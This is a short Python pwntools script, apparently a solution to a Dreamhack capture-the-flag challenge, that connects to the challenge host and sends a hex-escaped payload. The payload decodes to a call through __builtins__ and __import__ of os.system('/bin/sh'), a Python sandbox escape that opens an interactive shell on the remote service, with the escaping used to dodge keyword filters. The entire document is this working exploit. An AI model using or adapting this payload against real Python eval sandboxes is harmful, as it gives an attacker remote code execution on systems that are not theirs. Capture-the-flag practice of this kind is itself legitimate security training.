from pwn import *

r = remote('host3.dreamhack.games', 31479)
payload = "getattr(getattr(__builtins__, '\\x5f\\x5f\\x69\\x6d\\x70\\x6f\\x72\\x74\\x5f\\x5f')('\\x6f\\x73'), '\\x73\\x79\\x73\\x74\\x65\\x6d')('\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68')"
r.sendline(payload)
r.interactive()
